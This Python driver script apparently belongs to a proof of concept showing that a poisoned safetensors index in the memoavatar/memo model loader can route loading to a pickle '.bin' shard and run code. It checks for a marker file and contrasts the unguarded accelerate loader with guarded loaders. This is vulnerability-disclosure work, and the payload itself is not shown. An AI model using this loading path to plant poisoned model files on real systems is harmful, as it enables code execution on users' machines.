#!/usr/bin/env python
"""run_poc.py -- drive the MEMO product call site against one model root.

Usage (inside the container, from /work/poc):

    python run_poc.py out/memo_model_index_bin     # POSITIVE arm (index -> second_stage.bin)
    python run_poc.py out/memo_model_index_safe    # NEGATIVE arm (index -> safe.safetensors)
    python run_poc.py out/memo_model_noindex       # CONTROL   (no index file at all)
    python run_poc.py out/memo_model_index_bin --guard   # same shard, both library loaders

The loader call below is copied verbatim from the product, memoavatar/memo @
151b02438f0b inference.py:143-145 (finetune.py:186-188 and :283-285 make the same
call):

    reference_net = UNet2DConditionModel.from_pretrained(
        config.model_name_or_path, subfolder="reference_net", use_safetensors=True
    )

`config.model_name_or_path` is the model root (in the real deployment the Hub repo
id "memoavatar/memo", resolved to a local snapshot directory); the PoC passes a
local model root directly, which is the same code path.
"""

import argparse
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(HERE, "out")
MARKER = os.path.join(OUT, "RCE_MARKER_MEMO_SHARD_INDEX.txt")
SIDECAR_MARKER = os.path.join(OUT, "RCE_MARKER_SIDECAR_IMPORT.txt")

PRODUCT_CALL = (
    '    reference_net = UNet2DConditionModel.from_pretrained(\n'
    '        config.model_name_or_path, subfolder="reference_net", use_safetensors=True\n'
    '    )'
)


def banner(title):
    print("")
    print("=" * 72)
    print(title)
    print("=" * 72)


def clear_markers():
    for p in (MARKER, SIDECAR_MARKER):
        if os.path.exists(p):
            os.unlink(p)


def marker_state():
    return "PRESENT" if os.path.exists(MARKER) else "ABSENT"


def shard_from_index(ref_dir, key="conv_in.weight"):
    import json

    index_path = os.path.join(ref_dir, "diffusion_pytorch_model.safetensors.index.json")
    if not os.path.exists(index_path):
        return None, None
    with open(index_path, "r", encoding="utf-8") as f:
        index = json.load(f)
    return index_path, index["weight_map"].get(key)


def print_env():
    import torch
    import accelerate
    import diffusers
    import transformers
    import huggingface_hub

    print("[driver] pid=%d" % os.getpid())
    print("[driver] python %s | torch %s | diffusers %s | accelerate %s | transformers %s | hub %s"
          % (sys.version.split()[0], torch.__version__, diffusers.__version__, accelerate.__version__,
             transformers.__version__, huggingface_hub.__version__))
    default_wo = (torch.load.__kwdefaults__ or {}).get("weights_only", "unset")
    print("[driver] torch.load weights_only default: %s (torch 2.5.1 resolves None to False; "
          "accelerate's sink passes no such argument -- see torch's own warning below)" % default_wo)


def product_load(root):
    """The exact product call, driven against a local model root."""
    from diffusers import UNet2DConditionModel

    banner("PRODUCT CALL (memo inference.py:143-145)")
    print(PRODUCT_CALL)
    print("")
    model = UNet2DConditionModel.from_pretrained(root, subfolder="reference_net", use_safetensors=True)
    print("[driver] MODEL CONSTRUCTED OK: %s" % type(model).__name__)

    ref_dir = os.path.join(root, "reference_net")
    _, shard = shard_from_index(ref_dir)
    if shard is not None:
        print("[driver] index weight_map['conv_in.weight'] -> %s" % shard)

    from safetensors.torch import load_file as st_load
    import torch

    safe_path = os.path.join(ref_dir, "safe.safetensors")
    if os.path.exists(safe_path):
        ref = st_load(safe_path)["conv_in.weight"]
        same = torch.equal(model.conv_in.weight.detach().cpu(), ref)
        print("[driver] conv_in.weight equals the benign safe.safetensors tensor: %s" % same)
    print("[driver] payload marker after load: %s  (%s)" % (marker_state(), MARKER))
    return 0


def guard_contrast(root):
    """The same poisoned bytes through the two loaders that exist in the stack."""
    import accelerate.utils.modeling as acc_modeling
    import diffusers.models.model_loading_utils as dif_loading

    shard = os.path.join(root, "reference_net", "second_stage.bin")
    print("[driver] shard under test: %s" % shard)

    banner("(a) accelerate 1.1.1 load_state_dict -- the loader the shard route uses")
    clear_markers()
    loaded = acc_modeling.load_state_dict(shard, device_map={"": "cpu"})
    print("[driver] returned %d key(s): %s" % (len(loaded), sorted(loaded)))
    print("[driver] payload marker: %s" % marker_state())

    banner("(b) diffusers 0.31.0 load_state_dict -- the guarded direct-file loader")
    clear_markers()
    try:
        dif_loading.load_state_dict(shard)
    except Exception as e:  # noqa: BLE001 - the guard's own error is the evidence
        print("[driver] refused by the guarded loader: %s: %s" % (type(e).__name__, str(e).strip()[:130]))
        inner = e.__cause__ or e.__context__
        for _ in range(3):
            if inner is None:
                break
            print("[driver]   caused by: %s: %s"
                  % (type(inner).__name__, str(inner).splitlines()[0][:130]))
            inner = inner.__cause__ or inner.__context__
    else:
        print("[driver] WARNING: guarded loader accepted the poisoned shard")
    print("[driver] payload marker: %s" % marker_state())

    banner("(c) torch.load(weights_only=True) -- the raw pickle guard, same bytes")
    clear_markers()
    import torch

    try:
        torch.load(shard, weights_only=True, map_location="cpu")
    except Exception as e:  # noqa: BLE001 - the guard's own error is the evidence
        print("[driver] refused: %s: %s" % (type(e).__name__, str(e)[:200]))
    else:
        print("[driver] WARNING: weights_only=True accepted the poisoned shard")
    print("[driver] payload marker: %s" % marker_state())
    return 0


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("root", help="model root directory (contains reference_net/)")
    ap.add_argument("--guard", action="store_true", help="run the two direct loaders on the shard")
    args = ap.parse_args()

    root = os.path.abspath(args.root)
    if not os.path.isdir(os.path.join(root, "reference_net")):
        print("[driver] no reference_net/ under %s" % root)
        return 2

    os.makedirs(OUT, exist_ok=True)
    clear_markers()

    banner("MEMO shard-index PoC -- root: %s" % root)
    print_env()

    if args.guard:
        rc = guard_contrast(root)
    else:
        print("[driver] reference_net/ contents: %s"
              % ", ".join(sorted(os.listdir(os.path.join(root, "reference_net")))))
        rc = product_load(root)

    if not os.path.exists(SIDECAR_MARKER):
        print("[driver] inert .py sidecar probe never imported (no %s)"
              % os.path.basename(SIDECAR_MARKER))
    else:
        print("[driver] WARNING: sidecar probe was imported")
    return rc


if __name__ == "__main__":
    sys.exit(main())
